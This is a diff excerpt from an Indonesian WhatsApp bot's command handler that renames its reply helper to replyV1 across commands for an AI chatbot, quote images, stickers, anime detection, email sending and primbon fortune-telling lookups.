 xnalzMemory[user].push({
@@ -27607,14 +27580,14 @@ xnalzMemory[user].push({
     content: ai
 })
 
-return Reply(ai)
+return replyV1(ai)
 
 }
 break
 case 'chatgpt': {
     const quotedText = m.quoted?.text || m.quoted?.caption || ""
     if (!text && !quotedText) {
-        return Reply(
+        return replyV1(
             "⚠️ Masukkan pertanyaan!\n\n" +
             "Contoh:\n" +
             ".chatgpt Kenapa XnalzNotDev Ganteng?\n\n" +
@@ -27623,7 +27596,7 @@ case 'chatgpt': {
         )
     }
     try {
-        await Reply("⏳ Sedang memproses pertanyaanmu...")
+        await replyV1("⏳ Sedang memproses pertanyaanmu...")
         // Kalau user reply pesan, jadikan pesan tersebut sebagai konteks
         let prompt = text
         if (m.quoted && quotedText) {
@@ -27705,10 +27678,10 @@ Jika user me-reply pesan sebelumnya, gunakan isi pesan yang direply sebagai kont
         if (!hasil) {
             throw new Error("Response dari Groq kosong.")
         }
-        await Reply(hasil)
+        await replyV1(hasil)
     } catch (e) {
         console.error("GROQ ERROR:", e)
-        await Reply(
+        await replyV1(
             "❌ Ai nya ngambek jir kemungkinan ada error, nih kayaknya : " +
             e.message
         )
@@ -27719,7 +27692,7 @@ Jika user me-reply pesan sebelumnya, gunakan isi pesan yang direply sebagai kont
 case "getpp": {
 
 let target = m.quoted ? m.quoted.sender : m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : null
-if (!target) return Reply("Reply/@tag target nya")
+if (!target) return replyV1("Reply/@tag target nya")
 
 var ppuser
 try {
@@ -27733,7 +27706,7 @@ break
 case "iqccustom": {
     const input = String(text || '').trim();
     if (!input) {
-        return Reply(
+        return replyV1(
             `📱 *ɪᴘʜᴏɴᴇ ǫᴜᴏᴛᴇ ᴄᴜsᴛᴏᴍ*\n\n` +
             `Atur jam, persentase baterai, dan pesan pada gambar.\n\n` +
             `Format: *${prefix}iqccustom jam|baterai|pesan*\n` +
@@ -27743,7 +27716,7 @@ case "iqccustom": {
 
     const parts = input.split('|');
     if (parts.length < 3) {
-        return Reply(
+        return replyV1(
             `⚠️ *Format IQC Custom belum benar*\n\n` +
             `Gunakan: *${prefix}iqccustom jam|baterai|pesan*\n` +
             `Contoh: *${prefix}iqccustom 18:00|40|Jangan menyerah hari ini ♡*`
@@ -27756,13 +27729,13 @@ case "iqccustom": {
     const battery = Number(batteryText);
 
     if (!/^(?:[01]?\d|2[0-3]):[0-5]\d$/.test(time)) {
-        return Reply('⏰ Format jam tidak valid. Gunakan format 24 jam, contoh: *18:00*.');
+        return replyV1('⏰ Format jam tidak valid. Gunakan format 24 jam, contoh: *18:00*.');
     }
     if (!/^\d{1,3}$/.test(batteryText) || !Number.isInteger(battery) || battery < 0 || battery > 100) {
-        return Reply('🔋 Persentase baterai harus berupa angka dari 0 sampai 100.');
+        return replyV1('🔋 Persentase baterai harus berupa angka dari 0 sampai 100.');
     }
-    if (!messageText) return Reply('💬 Teks quote tidak boleh kosong.');
-    if (messageText.length > 4000) return Reply('💬 Pesan terlalu panjang. Maksimal 4000 karakter.');
+    if (!messageText) return replyV1('💬 Teks quote tidak boleh kosong.');
+    if (messageText.length > 4000) return replyV1('💬 Pesan terlalu panjang. Maksimal 4000 karakter.');
 
     try {
         await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } }).catch(() => {});
@@ -27811,7 +27784,7 @@ case "iqccustom": {
         console.error('[XERYUU IQC CUSTOM]', error?.stack || error);
         await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => {});
         const reason = String(error?.message || 'Terjadi kesalahan saat memproses IQC Custom').slice(0, 150);
-        return Reply(
+        return replyV1(
             `╭─「 ⚠️ *ɪǫᴄ ᴄᴜsᴛᴏᴍ ɢᴀɢᴀʟ* 」\n` +
             `│ Quote belum berhasil dibuat.\n` +
             `│ Alasan: ${reason}\n` +
@@ -27824,13 +27797,13 @@ case "iqc": {
     const prompt = String(text || '').trim();
     if (!prompt) {
         await conn.sendMessage(m.chat, { react: { text: '💬', key: m.key } }).catch(() => {});
-        return Reply(
+        return replyV1(
             `📱 *ɪᴘʜᴏɴᴇ ǫᴜᴏᴛᴇ ᴄʀᴇᴀᴛᴏʀ*\n\n` +
             `Masukkan teks yang ingin dijadikan quote.\n` +
             `Contoh: *${prefix}iqc Aku baik-baik saja, hanya sedang belajar ikhlas ♡*`
         );
     }
-    if (prompt.length > 4000) return Reply('💬 Teks terlalu panjang. Maksimal 4000 karakter.');
+    if (prompt.length > 4000) return replyV1('💬 Teks terlalu panjang. Maksimal 4000 karakter.');
 
     await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } }).catch(() => {});
 
@@ -27938,7 +27911,7 @@ case "iqc": {
         console.error('[XERYUU IQC]', error?.stack || error);
         await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => {});
         const reason = String(error?.message || 'Terjadi kesalahan saat memproses IQC').slice(0, 150);
-        return Reply(
+        return replyV1(
             `╭─「 ⚠️ *ɪǫᴄ ɢᴀɢᴀʟ* 」\n` +
             `│ Gambar quote belum berhasil dibuat.\n` +
             `│ Alasan: ${reason}\n` +
@@ -27949,9 +27922,9 @@ case "iqc": {
 break;
 
 case "swm": case "stickerwm": case "stikerwm": case "wm": {
-if (!text) return Reply(example("namamu dengan kirim media"))
-if (!/image|video/gi.test(mime)) return Reply(example("namamu dengan kirim media"))
-if (/video/gi.test(mime) && qmsg.seconds > 15) return Reply("Durasi vidio maksimal 15 detik!")
+if (!text) return replyV1(example("namamu dengan kirim media"))
+if (!/image|video/gi.test(mime)) return replyV1(example("namamu dengan kirim media"))
+if (/video/gi.test(mime) && qmsg.seconds > 15) return replyV1("Durasi vidio maksimal 15 detik!")
 var image = await conn.downloadAndSaveMediaMessage(qmsg)
 await conn.sendAsSticker(m.chat, image, m, {packname: text})
 await fs.unlinkSync(image)
@@ -28089,16 +28062,16 @@ break
                     "Gorong-gorong",
                 ])
                 const response = `🔮 CEK KHODAM\n\n👤 Nama: ${namaKhodam}\n🧿 Khodam: ${khodam}\n\n_Hasil acak, hanya untuk hiburan._`
-                Reply(response)
+                replyV1(response)
             }
                 break
 
 case 'totalfitur': {
     try {
         let total = totalfitur();
-        Reply(`Total fitur aktif saat ini: ${total} fitur!`);
+        replyV1(`Total fitur aktif saat ini: ${total} fitur!`);
     } catch (e) {
-        Reply(`Gagal membaca total fitur:\n${e.message}`);
+        replyV1(`Gagal membaca total fitur:\n${e.message}`);
     }
 }
 break
@@ -28164,9 +28137,9 @@ case 'bin': {
 break
 
 case 'lemonmail': {
- const argsxx = text.split('|'); if (argsxx.length < 3) return Reply('Format salah! Gunakan: email|subject|pesan');
+ const argsxx = text.split('|'); if (argsxx.length < 3) return replyV1('Format salah! Gunakan: email|subject|pesan');
 const [target, subject, message] = argsxx;
-        Reply('Mengirim email...');
+        replyV1('Mengirim email...');
         try {
             const data = JSON.stringify({ "to": target.trim(), "subject": subject.trim(), "message": message.trim() });
             const config = {
@@ -28190,9 +28163,9 @@ const [target, subject, message] = argsxx;
             };
             const axios = require('axios');
             const api = await axios.request(config);
-            Reply(`Hasil: ${JSON.stringify(api.data, null, 2)}`);
+            replyV1(`Hasil: ${JSON.stringify(api.data, null, 2)}`);
         } catch (error) {
-            Reply(`Error: ${error.message}`);
+            replyV1(`Error: ${error.message}`);
         }
         }
         break
@@ -28200,7 +28173,7 @@ case 'animefind': {
   try {
     const quoted = m.quoted ? m.quoted : m
     const mime = (quoted.msg || quoted).mimetype || ''
-    if (!/image/.test(mime)) return Reply("Harap Reply ke gambar yang mau dicari")
+    if (!/image/.test(mime)) return replyV1("Harap Reply ke gambar yang mau dicari")
     const media = await quoted.download()
     const detect = async (buffer) => {
       const axios = require('axios')
@@ -28300,7 +28273,7 @@ case 'animefind': {
     }
     const res = await detect(media)
     const fixed = num => (num * 100).toFixed(2)
-    if (!res.is_char) return Reply("Tidak terdeteksi karakter di gambar tersebut")
+    if (!res.is_char) return replyV1("Tidak terdeteksi karakter di gambar tersebut")
     const teks = `
 *⎣⧉⎤ Karakter yang terdeteksi adalah*
 > *Nama:* ${res.data.character.name}
@@ -28315,15 +28288,15 @@ ${res.data.rating.map(it => `> *${it.label}:* ${fixed(it.confidence || 0)}%`).jo
 *⎣⧉⎤ Tag*
 ${res.data.tags.list.map(it => `> *${it.label}:* ${fixed(it.confidence || 0)}%`).join('\n')}
 `.trim()
-    Reply(teks)
+    replyV1(teks)
   } catch (e) {
     console.error(e)
-    Reply(`Terjadi kesalahan saat mendeteksi karakter!\n\n${e.message}`)
+    replyV1(`Terjadi kesalahan saat mendeteksi karakter!\n\n${e.message}`)
   }
 }
 break
 case 'createquote': {
-  if (!text) return Reply('Kirim teks quotesnya!\nContoh: .quoteimg Jangan pernah menyerah, bro.');
+  if (!text) return replyV1('Kirim teks quotesnya!\nContoh: .quoteimg Jangan pernah menyerah, bro.');
   const { createCanvas, loadImage } = require('canvas');
   function wrapText(ctx, text, maxWidth) {
     const words = text.split(' ');
@@ -28381,7 +28354,7 @@ case 'createquote': {
 break
 
 case "qc": {
-if (!text) return Reply(example('teksnya'))
+if (!text) return replyV1(example('teksnya'))
 let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
 var ppuser
 try {
@@ -28418,7 +28391,7 @@ const json = {
     const buffer = Buffer.from(res.data.result.image, 'base64')
     let tempnya = "./library/database/sampah/"+m.sender+".png"
 await fs.writeFile(tempnya, buffer, async (err) => {
-if (err) return Reply("Error")
+if (err) return replyV1("Error")
 await conn.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
 await fs.unlinkSync(`${tempnya}`)
 })
@@ -28427,8 +28400,8 @@ await fs.unlinkSync(`${tempnya}`)
 break
 
 case "searchsticker": {
-    if (!text) return Reply('Sticker Apa Yg Kamu Cari?')
-    Reply('_Sedang Mencari Sticker..._');
+    if (!text) return replyV1('Sticker Apa Yg Kamu Cari?')
+    replyV1('_Sedang Mencari Sticker..._');
     
     try {
         let apiUrl = `https://api.agatz.xyz/api/sticker?message=${encodeURIComponent(text)}`;
@@ -28436,7 +28409,7 @@ case "searchsticker": {
         const response = await res.json();
         
         if (!response.data?.sticker_url || response.data.sticker_url.length === 0) {
-            return Reply('Tidak ditemukan sticker yang sesuai');
+            return replyV1('Tidak ditemukan sticker yang sesuai');
         }
 
         const packNames = [
@@ -28484,148 +28457,148 @@ case "searchsticker": {
         }
 
         if (successCount < maxStickers) {
-            Reply(`Berhasil mengirim ${successCount} sticker dari ${maxStickers} yang dicoba`);
+            replyV1(`Berhasil mengirim ${successCount} sticker dari ${maxStickers} yang dicoba`);
         } else if (response.data.sticker_url.length > 10) {
-            Reply(`Menampilkan ${successCount} sticker random dari ${response.data.sticker_url.length} sticker yang ditemukan`);
+            replyV1(`Menampilkan ${successCount} sticker random dari ${response.data.sticker_url.length} sticker yang ditemukan`);
         }
 
     } catch (e) {
         console.error('Error in stickersearch:', e);
-        Reply('Terjadi kesalahan saat mencari sticker');
+        replyV1('Terjadi kesalahan saat mencari sticker');
     }
 }
 break
 //primbon menu
 case 'artimimpi': case 'tafsirmimpi': {
 
-if (!text) return Reply(`Contoh : ${command} belanja`)
+if (!text) return replyV1(`Contoh : ${command} belanja`)
 let anu = await primbon.tafsir_mimpi(text)
-if (anu.status == false) return Reply(anu.message)
-Reply(`• *Mimpi :* ${anu.message.mimpi}\n• *Arti :* ${anu.message.arti}\n• *Solusi :* ${anu.message.solusi}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Mimpi :* ${anu.message.mimpi}\n• *Arti :* ${anu.message.arti}\n• *Solusi :* ${anu.message.solusi}`)
 }
 break
 case 'ramalanjodoh': case 'ramaljodoh': {
 
-if (!text) return Reply(`Contoh : ${command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
+if (!text) return replyV1(`Contoh : ${command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
-if (anu.status == false) return Reply(anu.message)
-Reply(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'ramalanjodohbali': case 'ramaljodohbali': {
 
-if (!text) return Reply(`Contoh : ${command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
+if (!text) return replyV1(`Contoh : ${command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
-if (anu.status == false) return Reply(anu.message)
-Reply(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'suamiistri': {
 
-if (!text) return Reply(`Contoh : ${command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
+if (!text) return replyV1(`Contoh : ${command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
-if (anu.status == false) return Reply(anu.message)
-Reply(`• *Nama Suami :* ${anu.message.suami.nama}\n• *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n• *Nama Istri :* ${anu.message.istri.nama}\n• *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Nama Suami :* ${anu.message.suami.nama}\n• *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n• *Nama Istri :* ${anu.message.istri.nama}\n• *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'ramalancinta': case 'ramalcinta': {
 
-if (!text) return Reply(`Contoh : ${command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
+if (!text) return replyV1(`Contoh : ${command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
-if (anu.status == false) return Reply(anu.message)
-Reply(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}\n• *Catatan :* ${anu.message.catatan}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'artinama': {
 
-if (!text) return Reply(`Contoh : ${command} Dika Ardianta`)
+if (!text) return replyV1(`Contoh : ${command} Dika Ardianta`)
 let anu = await primbon.arti_nama(text)
-if (anu.status == false) return Reply(anu.message)
-Reply(`• *Nama :* ${anu.message.nama}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Nama :* ${anu.message.nama}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'kecocokannama': case 'cocoknama': {
 
-if (!text) return Reply(`Contoh : ${command} Dika, 7, 7, 2005`)
+if (!text) return replyV1(`Contoh : ${command} Dika, 7, 7, 2005`)
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
-if (anu.status == false) return Reply(anu.message)
-Reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Life Path :* ${anu.message.life_path}\n• *Destiny :* ${anu.message.destiny}\n• *Destiny Desire :* ${anu.message.destiny_desire}\n• *Personality :* ${anu.message.personality}\n• *Persentase :* ${anu.message.persentase_kecocokan}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Life Path :* ${anu.message.life_path}\n• *Destiny :* ${anu.message.destiny}\n• *Destiny Desire :* ${anu.message.destiny_desire}\n• *Personality :* ${anu.message.personality}\n• *Persentase :* ${anu.message.persentase_kecocokan}`)
 }
 break
 case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
 
-if (!text) return Reply(`Contoh : ${command} Dika|Novia`)
+if (!text) return replyV1(`Contoh : ${command} Dika|Novia`)
 let [nama1, nama2] = text.split`|`
 let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
-if (anu.status == false) return Reply(anu.message)
+if (anu.status == false) return replyV1(anu.message)
 conn.sendImage(m.chat,  anu.message.gambar, `• *Nama Anda :* ${anu.message.nama_anda}\n• *Nama Pasangan :* ${anu.message.nama_pasangan}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}`)
 }
 break
 case 'jadianpernikahan': case 'jadiannikah': {
 
-if (!text) return Reply(`Contoh : ${command} 6, 12, 2020`)
+if (!text) return replyV1(`Contoh : ${command} 6, 12, 2020`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
-if (anu.status == false) return Reply(anu.message)
-Reply(`• *Tanggal Pernikahan :* ${anu.message.tanggal}\n• *karakteristik :* ${anu.message.karakteristik}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Tanggal Pernikahan :* ${anu.message.tanggal}\n• *karakteristik :* ${anu.message.karakteristik}`)
 }
 break
 case 'sifatusaha': {
 
-if (!text) return Reply(`Contoh : ${prefix + command} 28, 12, 2021`)
+if (!text) return replyV1(`Contoh : ${prefix + command} 28, 12, 2021`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
-if (anu.status == false) return Reply(anu.message)
-Reply(`• *Lahir :* ${anu.message.hari_lahir}\n• *Usaha :* ${anu.message.usaha}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Lahir :* ${anu.message.hari_lahir}\n• *Usaha :* ${anu.message.usaha}`)
 }
 break
 case  ' rejeki': case 'rezeki': {
 
-if (!text) return Reply(`Contoh : ${command} 7, 7, 2005`)
+if (!text) return replyV1(`Contoh : ${command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
-if (anu.status == false) return Reply(anu.message)
-Reply(`• *Lahir :* ${anu.message.hari_lahir}\n• *Rezeki :* ${anu.message.rejeki}\n• *Catatan :* ${anu.message.catatan}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Lahir :* ${anu.message.hari_lahir}\n• *Rezeki :* ${anu.message.rejeki}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'pekerjaan': {
 
-if (!text) return Reply(`Contoh : ${command} 7, 7, 2005`)
+if (!text) return replyV1(`Contoh : ${command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
-if (anu.status == false) return Reply(anu.message)
-Reply(`• *Lahir :* ${anu.message.hari_lahir}\n• *Pekerjaan :* ${anu.message.pekerjaan}\n• *Catatan :* ${anu.message.catatan}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Lahir :* ${anu.message.hari_lahir}\n• *Pekerjaan :* ${anu.message.pekerjaan}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'ramalannasib': case 'ramalnasib': case 'nasib': {
 
-if (!text) return Reply(`Contoh : 7, 7, 2005`)
+if (!text) return replyV1(`Contoh : 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.ramalan_nasib(tgl, bln, thn)
-if (anu.status == false) return Reply(anu.message)
-Reply(`• *Analisa :* ${anu.message.analisa}\n• *Angka Akar :* ${anu.message.angka_akar}\n• *Sifat :* ${anu.message.sifat}\n• *Elemen :* ${anu.message.elemen}\n• *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Analisa :* ${anu.message.analisa}\n• *Angka Akar :* ${anu.message.angka_akar}\n• *Sifat :* ${anu.message.sifat}\n• *Elemen :* ${anu.message.elemen}\n• *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`)
 }
 break
 case 'potensipenyakit': case 'penyakit': {
 
-if (!text) return Reply(`Contoh : ${command} 7, 7, 2005`)
+if (!text) return replyV1(`Contoh : ${command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
-if (anu.status == false) return Reply(anu.message)
-Reply(`• *Analisa :* ${anu.message.analisa}\n• *Sektor :* ${anu.message.sektor}\n• *Elemen :* ${anu.message.elemen}\n• *Catatan :* ${anu.message.catatan}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Analisa :* ${anu.message.analisa}\n• *Sektor :* ${anu.message.sektor}\n• *Elemen :* ${anu.message.elemen}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'artitarot': case 'tarot': {
 
-if (!text) return Reply(`Contoh : ${command} 7, 7, 2005`)
+if (!text) return replyV1(`Contoh : ${command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
-if (anu.status == false) return Reply(anu.message)
+if (anu.status == false) return replyV1(anu.message)
 conn.sendImage(m.chat, anu.message.image, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Simbol Tarot :* ${anu.message.simbol_tarot}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
@@ -28634,113 +28607,113 @@ case 'fengshui': {
 if (!text) return `Contoh : ${command} Dika, 1, 2005\n\nNote : ${command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
 let [nama, gender, tahun] = text.split`,`
 let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
-if (anu.status == false) return Reply(anu.message)
-Reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tahun_lahir}\n• *Gender :* ${anu.message.jenis_kelamin}\n• *Angka Kua :* ${anu.message.angka_kua}\n• *Kelompok :* ${anu.message.kelompok}\n• *Karakter :* ${anu.message.karakter}\n• *Sektor Baik :* ${anu.message.sektor_baik}\n• *Sektor Buruk :* ${anu.message.sektor_buruk}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tahun_lahir}\n• *Gender :* ${anu.message.jenis_kelamin}\n• *Angka Kua :* ${anu.message.angka_kua}\n• *Kelompok :* ${anu.message.kelompok}\n• *Karakter :* ${anu.message.karakter}\n• *Sektor Baik :* ${anu.message.sektor_baik}\n• *Sektor Buruk :* ${anu.message.sektor_buruk}`)
 }
 break
 case 'haribaik': {
 
-if (!text) return Reply(`Contoh : ${command} 7, 7, 2005`)
+if (!text) return replyV1(`Contoh : ${command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.petung_hari_baik(tgl, bln, thn)
-if (anu.status == false) return Reply(anu.message)
-Reply(`• *Lahir :* ${anu.message.tgl_lahir}\n• *Kala Tinantang :* ${anu.message.kala_tinantang}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Lahir :* ${anu.message.tgl_lahir}\n• *Kala Tinantang :* ${anu.message.kala_tinantang}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'harisangar': case 'taliwangke': {
 
-if (!text) return Reply(`Contoh : ${command} 7, 7, 2005`)
+if (!text) return replyV1(`Contoh : ${command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
-if (anu.status == false) return Reply(anu.message)
-Reply(`• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'harinaas': case 'harisial': {
 
-if (!text) return Reply(`Contoh : ${command} 7, 7, 2005`)
+if (!text) return replyV1(`Contoh : ${command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
-if (anu.status == false) return Reply(anu.message)
-Reply(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Hari Naas :* ${anu.message.hari_naas}\n• *Info :* ${anu.message.catatan}\n• *Catatan :* ${anu.message.info}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Hari Naas :* ${anu.message.hari_naas}\n• *Info :* ${anu.message.catatan}\n• *Catatan :* ${anu.message.info}`)
 }
 break
 case 'nagahari': case 'harinaga': {
 
-if (!text) return Reply(`Contoh : ${command} 7, 7, 2005`)
+if (!text) return replyV1(`Contoh : ${command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
-if (anu.status == false) return Reply(anu.message)
-Reply(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n• *Catatan :* ${anu.message.catatan}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'arahrejeki': case 'arahrezeki': {
 
-if (!text) return Reply(`Contoh : ${command} 7, 7, 2005`)
+if (!text) return replyV1(`Contoh : ${command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
-if (anu.status == false) return Reply(anu.message)
-Reply(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Rezeki :* ${anu.message.arah_rejeki}\n• *Catatan :* ${anu.message.catatan}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Rezeki :* ${anu.message.arah_rejeki}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'peruntungan': {
 
-if (!text) return Reply(`Contoh : ${command} DIka, 7, 7, 2005, 2022\n\nNote : ${command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
+if (!text) return replyV1(`Contoh : ${command} DIka, 7, 7, 2005, 2022\n\nNote : ${command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
 let [nama, tgl, bln, thn, untuk] = text.split`,`
 let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
-if (anu.status == false) return Reply(anu.message)
